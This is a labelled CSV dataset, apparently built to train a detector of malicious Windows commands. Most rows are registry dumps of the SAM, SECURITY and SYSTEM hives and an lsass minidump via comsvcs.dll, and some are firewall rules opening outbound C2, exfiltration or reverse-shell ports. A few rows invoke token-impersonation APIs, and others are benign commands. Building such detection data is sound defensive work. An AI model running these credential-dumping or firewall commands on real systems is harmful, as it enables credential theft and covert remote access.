text,label
"cmd.exe /c ""reg export hklm\sam c:\temp\g95hs9j3.dat""",1
reg export hklm\sam c:\windows\temp\0km8d0ec.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\ha8mus2r.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\voiuibor.dat""",1
"powershell -nop -c ""powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\c00xooub.dat""""",1
"cmd.exe /c ""reg   export   hklm\system   c:\windows\temp\7d5h9evg.save""",1
"powershell -nop -c ""[dllimport(""advapi32.dll"")] extern bool impersonateloggedonuser(...)""",3
reg save hklm\sam c:\windows\temp\wwi8mur1.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\kl1dy7mz.dat""",1
"powershell -nop -c ""cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\irtp8p1c.dat""""",1
reg  export  hklm\security  c:\windows\temp\pe6ppnk3.save,1
reg save hklm\sam c:\windows\temp\v0wcq46y.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\asmexwl6.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\sp5lgpet.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\f000aq2e.dat""",1
reg export hklm\system c:\windows\temp\br5etfl4.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\9wawsvut.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\windows\temp\0zstp7dx.save""",1
"powershell -nop -c ""reg save hklm\security c:\temp\kmfw9ia7.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\y1zsqdy8.dat""",1
reg export hklm\security c:\windows\temp\wabub4e0.save,1
"cmd.exe /c ""cmd.exe /c ""reg save hklm\sam c:\temp\rbc2f334.dat""""",1
reg export hklm\security c:\windows\temp\7mr2udbv.save,1
reg save hklm\system c:\windows\temp\qby85wbw.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\k4qufea8.dat""",1
reg  save  hklm\system  c:\windows\temp\60m486bm.save,1
reg save hklm\system c:\windows\temp\hkflne62.save,1
reg save hklm\system c:\windows\temp\anoqnbjf.save,1
"cmd.exe /c ""java   -jar   application.jar""",0
"cmd.exe /c ""reg export hklm\security c:\temp\74660mou.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\nj5j8q1c.dat""",1
reg export hklm\sam c:\windows\temp\4tlqk4p8.save,1
reg export hklm\sam c:\windows\temp\b6eu37y7.save,1
reg export hklm\sam c:\windows\temp\fmd6934v.save,1
reg export hklm\security c:\windows\temp\90tup25p.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\b2r6b4nk.dat""",1
"powershell -nop -c ""token::elevate""",3
reg save hklm\system c:\windows\temp\nzfxqjwl.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\rho5kr6n.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\uouei6ng.dat""",1
reg export hklm\system c:\windows\temp\9fuj6wxi.save,1
"powershell -nop -c ""reg  save  hklm\system  c:\windows\temp\chy40e6w.save""",1
"cmd.exe /c ""reg export hklm\security c:\temp\irvhpy8x.dat""",1
reg export hklm\security c:\windows\temp\gw7vw858.save,1
rule:   c2   beacon   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   4444,2
reg save hklm\system c:\windows\temp\wa15o4vb.save,1
reg save hklm\security c:\windows\temp\ig0c2unt.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\lo95cikh.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\10m1xyni.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\e54vmr4z.dat""",1
"powershell -nop -c ""[dllimport(""advapi32.dll"")]  extern  bool  impersonateloggedonuser(...)""",3
reg export hklm\sam c:\windows\temp\fuc2eien.save,1
reg export hklm\sam c:\windows\temp\zzun1c2g.save,1
reg save hklm\security c:\windows\temp\79xx9gr7.save,1
reg save hklm\sam c:\windows\temp\9d3ac7i7.save,1
reg save hklm\security c:\windows\temp\sousy19j.save,1
reg save hklm\security c:\windows\temp\efdrrvtt.save,1
"cmd.exe /c ""[dllimport(""advapi32.dll"")] extern bool duplicatetokenex(...)""",3
reg export hklm\sam c:\windows\temp\25weunju.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\pexvzfib.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\urzol1eb.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\2xz1c059.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\p472skms.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\0v0c9hn7.dat""",1
reg save hklm\security c:\windows\temp\frajspzo.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\mky04kb2.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\riubb5ch.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\r962ndlc.dat""",1
reg export hklm\sam c:\windows\temp\mjus0p0j.save,1
"cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\nyqjdiy5.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\i3t0sbgo.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\x6ilz8is.dat""",1
reg export hklm\security c:\windows\temp\akxlr3la.save,1
reg export hklm\sam c:\windows\temp\sibw1ggu.save,1
reg export hklm\security c:\windows\temp\mw3ywp5b.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\9zdf7p2g.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\hw69buum.dat""",1
reg save hklm\system c:\windows\temp\ued44eai.save,1
reg  export  hklm\system  c:\windows\temp\9yl5dkwt.save,1
"powershell -nop -c ""rule:  c2  beacon  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
"powershell -nop -c ""reg export hklm\security c:\temp\8e6oypib.dat""",1
"powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\xs0kmn8i.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\srydt2vm.dat""",1
reg save hklm\security c:\windows\temp\1hi1hh3z.save,1
reg export hklm\sam c:\windows\temp\q22ohsfj.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\k51d9p52.dat""",1
reg save hklm\sam c:\windows\temp\dxxipn8p.save,1
"cmd.exe /c ""rule:  exfil  data  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888""",2
"cmd.exe /c ""reg save hklm\sam c:\temp\256ov8j5.dat""",1
reg export hklm\sam c:\windows\temp\t0rl82k7.save,1
reg   save   hklm\system   c:\windows\temp\escho9uk.save,1
reg export hklm\sam c:\windows\temp\tdnd8p21.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\oeddd4nh.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\wzzcp4y3.dat""",1
reg save hklm\security c:\windows\temp\kq1ulrck.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\7urrcs63.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\yi9l6cxt.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\1mn1296a.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\sxovmt3n.dat""",1
reg export hklm\sam c:\windows\temp\xyvrfzq1.save,1
"powershell -nop -c ""rule: c2 beacon | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 4444""",2
"powershell -nop -c ""rule:   exfil   data   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
reg export hklm\security c:\windows\temp\yfgbfde7.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\zx4462e3.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\baayqx3d.dat""",1
reg export hklm\security c:\windows\temp\ky0knpmb.save,1
"powershell -nop -c ""wmic  product  get  name,  version""",0
netsh  dump  >  netconfig.txt,0
reg save hklm\system c:\windows\temp\0mwillxe.save,1
"cmd.exe /c ""powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\rd4o0jn3.dat""""",1
"powershell -nop -c ""reg save hklm\security c:\temp\hb10n3bw.dat""",1
reg export hklm\system c:\windows\temp\fe94dxjv.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\dvaecp72.dat""",1
reg save hklm\sam c:\windows\temp\aykwyuv1.save,1
"cmd.exe /c ""rule:   c2   beacon   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
reg export hklm\system c:\windows\temp\3j74vk96.save,1
reg save hklm\system c:\windows\temp\b8lp1hj4.save,1
"powershell -nop -c ""rule:   reverse   shell   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
"cmd.exe /c ""reg export hklm\security c:\temp\cacwqafm.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\2ilmvq4v.dat""",1
reg export hklm\system c:\windows\temp\5k2fd3a6.save,1
"cmd.exe /c ""netsh advfirewall firewall add rule name=""bad"" action=allow protocol=any port=4444""",2
"cmd.exe /c ""reg save hklm\security c:\temp\j4n25o8a.dat""",1
reg export hklm\system c:\windows\temp\npalka2k.save,1
reg export hklm\system c:\windows\temp\fc3vdtr9.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\h9uwydcj.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\yusq3681.dat""",1
reg save hklm\sam c:\windows\temp\5wmu3kat.save,1
rule:  exfil  data  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  4444,2
"powershell -nop -c ""reg save hklm\security c:\temp\tde6ddj6.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\23vp1zym.dat""",1
reg export hklm\security c:\windows\temp\ctwl5px1.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\hjfahxb0.dat""",1
reg save hklm\security c:\windows\temp\9lpioj5a.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\fu9cb9h9.dat""",1
reg save hklm\sam c:\windows\temp\dee2788e.save,1
reg save hklm\sam c:\windows\temp\0qn79e4g.save,1
reg save hklm\system c:\windows\temp\3329m2ib.save,1
"cmd.exe /c ""reg export hklm\system c:\windows\temp\panfkdoo.save""",1
reg export hklm\security c:\windows\temp\cjd8izss.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\g9b4h5k0.dat""",1
"cmd.exe /c ""$a  =  [ref].assembly.gettype('system.management.automation.openprocesstoken')""",3
reg save hklm\system c:\windows\temp\hmtnplye.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\a5bes708.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\brrx777g.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\ebfb2oa4.dat""",1
"cmd.exe   /c   ""reg   save   hklm\security   c:\temp\ci8l7j4f.dat""",1
reg  export  hklm\system  c:\windows\temp\29hlknr9.save,1
rule:   reverse   shell   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   1337,2
reg save hklm\system c:\windows\temp\6uv1p390.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\hgzm1rzc.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\t3984bzn.dat""",1
"cmd.exe /c ""rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full""",1
reg save hklm\system c:\windows\temp\sy8n0ibw.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\3xfy50ui.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\ebi7r260.dat""",1
reg save hklm\system c:\windows\temp\eenk3dcm.save,1
reg export hklm\security c:\windows\temp\dyhz1ed4.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\3zzw0yil.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\q3vp0akk.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\qtzg93n7.dat""",1
"powershell -nop -c ""cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\ssdh6tox.dat""""",1
reg save hklm\security c:\windows\temp\dzqugirw.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\s4lxqgpo.dat""",1
reg save hklm\system c:\windows\temp\rlecnad8.save,1
rule:   reverse   shell   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888,2
"powershell -nop -c ""reg export hklm\sam c:\temp\u7a9vwve.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\elcseawn.dat""",1
reg save hklm\sam c:\windows\temp\nbkxfpo3.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\80lnpyv6.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\m1s6sasi.dat""",1
rule:  reverse  shell  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888,2
"cmd.exe /c ""reg save hklm\security c:\temp\htlqohj6.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\f3esevqe.dat""",1
reg save hklm\security c:\windows\temp\oga8ump5.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\i0nzb0pk.dat""",1
"cmd.exe /c ""reg save hklm\system c:\windows\temp\4lebh29l.save""",1
reg export hklm\security c:\windows\temp\0b5k5omw.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\2974fnya.dat""",1
reg export hklm\sam c:\windows\temp\hp7p0v6v.save,1
"cmd.exe /c ""reg   save   hklm\sam   c:\windows\temp\p2cijakv.save""",1
"powershell -nop -c ""rule:  exfil  data  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
"cmd.exe /c ""reg save hklm\system c:\windows\temp\7yiefrw2.save""",1
reg export hklm\system c:\windows\temp\6zmm0vlz.save,1
"powershell -nop -c ""powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\nz097c7u.dat""""",1
"powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\5yx3wx1j.dat""",1
"powershell -nop -c ""cmd.exe /c ""reg save hklm\security c:\temp\uezm47si.dat""""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\oqz4kyef.dat""",1
"powershell -nop -c ""rule:  c2  beacon  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
"cmd.exe /c ""reg save hklm\sam c:\temp\ijydwvcr.dat""",1
reg save hklm\system c:\windows\temp\qsh6lyly.save,1
reg save hklm\sam c:\windows\temp\9vcfeip3.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\wmjt3fvu.dat""",1
reg save hklm\system c:\windows\temp\rzznl3np.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\gns4pmtg.dat""",1
"cmd.exe /c ""sc query windefend""",0
reg save hklm\security c:\windows\temp\evjej2hy.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\ur0q073x.dat""",1
reg export hklm\sam c:\windows\temp\pznrzt6f.save,1
reg export hklm\security c:\windows\temp\i1tm8ht8.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\artkbjoz.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\7r4m61ry.dat""",1
"cmd.exe /c ""powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\mvpvgtwy.dat""""",1
"powershell -nop -c ""rule: reverse shell | app: any | dir: outbound | act: allow | port: tcp 8888""",2
"powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\xblu9b1k.dat""",1
reg export hklm\system c:\windows\temp\hkaucl7d.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\sdc8e7qg.dat""",1
"powershell -nop -c ""netsh dump > netconfig.txt""",0
"cmd.exe /c ""reg save hklm\security c:\temp\ow6agqpp.dat""",1
reg save hklm\system c:\windows\temp\i263v4oh.save,1
reg save hklm\sam c:\windows\temp\9jjxyfz8.save,1
reg export hklm\security c:\windows\temp\nwf2yos6.save,1
reg save hklm\system c:\windows\temp\lc0y5upg.save,1
reg save hklm\system c:\windows\temp\ot3dac0y.save,1
reg export hklm\security c:\windows\temp\6z4khu27.save,1
reg export hklm\system c:\windows\temp\vhbtv6sd.save,1
reg save hklm\system c:\windows\temp\zmx69zw7.save,1
"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
reg export hklm\sam c:\windows\temp\dtw47gd3.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\3v7i437q.dat""",1
"cmd.exe /c ""reg save hklm\security c:\windows\temp\7jyyshxc.save""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\m39dtdtc.dat""",1
reg export hklm\sam c:\windows\temp\hk9zlydi.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\53x6sfmu.dat""",1
reg export hklm\security c:\windows\temp\9lxs973g.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\uhzbodtt.dat""",1
reg export hklm\system c:\windows\temp\3c53dcqt.save,1
"cmd.exe /c ""[dllimport(""advapi32.dll"")]  extern  bool  openprocesstoken(...)""",3
"cmd.exe /c ""powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\r228btro.dat""""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\xg3efvcb.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\owg9ulw2.dat""",1
reg export hklm\security c:\windows\temp\6au3ls7j.save,1
reg export hklm\sam c:\windows\temp\x2nnpjhd.save,1
reg export hklm\system c:\windows\temp\x3l8a0v7.save,1
"powershell -nop -c ""reg export hklm\security c:\windows\temp\ssg4fu8n.save""",1
reg save hklm\security c:\windows\temp\f1b5u1pm.save,1
reg export hklm\system c:\windows\temp\2i50cshb.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\qk1ghmp8.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\fex8itlx.dat""",1
reg   save   hklm\security   c:\windows\temp\gj12qb2w.save,1
reg export hklm\system c:\windows\temp\wezd0ukv.save,1
"cmd.exe /c ""powershell -nop -c ""reg export hklm\sam c:\temp\p674mri2.dat""""",1
"powershell -nop -c ""cmd.exe /c ""reg export hklm\security c:\temp\zejp88fr.dat""""",1
"powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\uguk7s5a.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\0ih6nxty.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\d0xc1crv.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\5zch1myl.dat""",1
reg save hklm\system c:\windows\temp\0egv7hiu.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\lng7lc3u.dat""",1
"powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\m9wwstr4.dat""",1
"powershell -nop -c ""reg   save   hklm\system   c:\windows\temp\3xj8c1xj.save""",1
"powershell -nop -c ""reg save hklm\security c:\temp\a2bxjgb0.dat""",1
"powershell -nop -c ""rule: reverse shell | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 4444""",2
reg export hklm\security c:\windows\temp\di7jkys0.save,1
reg export hklm\sam c:\windows\temp\k16lkh1d.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\xk1b8xv8.dat""",1
reg save hklm\security c:\windows\temp\jrv775xm.save,1
reg save hklm\system c:\windows\temp\uhzjm782.save,1
reg export hklm\security c:\windows\temp\l7hjgs7b.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\ulx984ns.dat""",1
select-string   -path   c:\logs\app.log   -pattern   'failed   logon',0
ping  8.8.8.8,0
reg export hklm\system c:\windows\temp\3cgi9iuz.save,1
"cmd.exe /c ""backup-utility   write   hklm\software   to   c:\backups\config.dat""",0
rule:   reverse   shell   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   4444,2
reg save hklm\security c:\windows\temp\1bxnul1l.save,1
"cmd.exe  /c  ""reg  export  hklm\security  c:\temp\z3b5yj5k.dat""",1
reg   save   hklm\system   c:\windows\temp\r6hqid8g.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\h7fnq4za.dat""",1
reg  save  hklm\sam  c:\windows\temp\fh07p961.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\l74kj3z1.dat""",1
reg export hklm\security c:\windows\temp\2pbuexje.save,1
reg save hklm\system c:\windows\temp\qy1zfd1l.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\tbhrlpzw.dat""",1
reg save hklm\system c:\windows\temp\sdgzjgdz.save,1
reg export hklm\system c:\windows\temp\foddgi6j.save,1
reg export hklm\system c:\windows\temp\2j40j5ag.save,1
reg save hklm\system c:\windows\temp\ivns2fj1.save,1
"cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\w2uvphe0.dat""",1
"cmd.exe /c ""cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\cvr9lois.dat""""",1
reg export hklm\system c:\windows\temp\oo7v4v1c.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\363yyszk.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\rt4xkmj6.dat""",1
"cmd.exe  /c  ""reg  save  hklm\security  c:\temp\pb06dyfi.dat""",1
reg export hklm\sam c:\windows\temp\9gf63cwx.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\pt203d62.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\07eff5wh.dat""",1
netsh dump > netconfig.txt,0
reg export hklm\sam c:\windows\temp\kwps9mjn.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\bo3r16uq.dat""",1
reg export hklm\security c:\windows\temp\oauc1xvq.save,1
reg save hklm\security c:\windows\temp\3l2cu9tu.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\1cfv61ok.dat""",1
reg export hklm\security c:\windows\temp\hohdufeu.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\oiz6jilr.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\tq1srug8.dat""",1
reg save hklm\sam c:\windows\temp\bf4hpamm.save,1
"powershell -nop -c ""powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\xbzep00m.dat""""",1
"powershell -nop -c ""reg export hklm\security c:\temp\vqnzxqxw.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\ozok14km.dat""",1
reg export hklm\security c:\windows\temp\ueigbnok.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\le7qc0ex.dat""",1
"cmd.exe /c ""[dllimport(""advapi32.dll"")]  extern  bool  impersonateloggedonuser(...)""",3
"cmd.exe /c ""reg export hklm\sam c:\temp\opkxdjuk.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\nzit1mx5.dat""",1
reg save hklm\system c:\windows\temp\nnoem9js.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\xw840ai6.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\41se3ifb.dat""",1
reg export hklm\sam c:\windows\temp\378qsx8s.save,1
reg save hklm\sam c:\windows\temp\vcvr8rkm.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\qxkzl8hg.dat""",1
reg export hklm\system c:\windows\temp\667rs64c.save,1
reg save hklm\security c:\windows\temp\y7st293h.save,1
"cmd.exe /c ""rule:   reverse   shell   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
"cmd.exe /c ""powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\abm3xryq.dat""""",1
"powershell -nop -c ""reg export hklm\security c:\temp\uq0kiz4j.dat""",1
reg save hklm\security c:\windows\temp\9dsb5jri.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\0w6idlof.dat""",1
node   server.js   --port   3000,0
"powershell -nop -c ""reg save hklm\security c:\temp\k4a2t57g.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\2t5v05q7.dat""",1
"powershell -nop -c ""rule:  c2  beacon  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888""",2
"powershell -nop -c ""reg save hklm\sam c:\temp\gtl1yg3o.dat""",1
rule: exfil data | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 1337,2
